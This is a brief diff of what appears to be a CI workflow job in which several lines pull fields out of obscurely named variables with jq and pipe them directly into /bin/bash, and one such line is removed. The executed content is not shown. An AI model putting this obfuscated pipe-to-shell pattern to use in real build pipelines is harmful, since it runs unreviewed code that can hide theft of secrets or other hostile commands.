@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$ptofv85373" | jq -r .rmswu14 | /bin/bash
           echo $qjg420 | jq -r .lctnv10 | /bin/bash
           printf '%s' "$gr5473" | jq -r .y2 | /bin/bash
-          echo $tr759 | jq -r .qaej81099 | /bin/bash
           echo $fhnl4 | jq -r .b21 | /bin/bash
 
       - name: Store results
